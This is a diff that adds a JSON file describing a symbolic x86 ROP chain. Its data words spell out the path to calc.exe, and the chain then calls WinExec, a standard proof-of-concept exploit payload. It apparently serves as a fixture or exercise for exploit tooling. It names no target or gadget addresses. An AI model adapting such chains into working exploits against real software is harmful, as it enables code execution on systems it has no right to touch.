@@ -1,0 +1,28 @@
+{
+    "payload": [
+        {"G": "MOV ECX, ESP ; RET"},
+        {"G": "SUB ECX, 32 ; RET"},
+        {"G": "POP EDX ; POP EAX ; RET"},
+        {"D": "0x575c3a43"},
+        {"D": "0x4f444e49"},
+        {"G": "MOV DWORD PTR DS:[ECX], EDX ; MOV DWORD PTR DS:[ECX+4], EAX ; RET"},
+        {"G": "POP EDX ; POP EAX ; RET"},
+        {"D": "0x735c5357"},
+        {"D": "0x65747379"},
+        {"G": "MOV DWORD PTR DS:[ECX+8], EDX ; MOV DWORD PTR DS:[ECX+12], EAX ; RET"},
+        {"G": "POP EDX ; POP EAX ; RET"},
+        {"D": "0x5c32336d"},
+        {"D": "0x636c6163"},
+        {"G": "MOV DWORD PTR DS:[ECX+16], EDX ; MOV DWORD PTR DS:[ECX+20], EAX ; RET"},
+        {"G": "POP EAX ; RET"},
+        {"D": "0x6578652e"},
+        {"G": "MOV DWORD PTR DS:[ECX+24], EAX ; RET"},
+        {"G": "XOR EAX, EAX ; RET"},
+        {"G": "ADD EAX, 1 ; RET"},
+        {"G": "MOV DWORD PTR DS:[ECX-4], EAX ; MOV DWORD PTR DS:[ECX-8], ECX ; RET"},
+        {"G": "POP ESI ; RET"},
+        {"F": "WinExec"},
+        {"G": "MOV ESP, ECX ; SUB ESP, 8 ; CALL ESI ; RET"},
+        {"G": "NOP ; NOP ; NOP ; RET"}
+    ]
+}
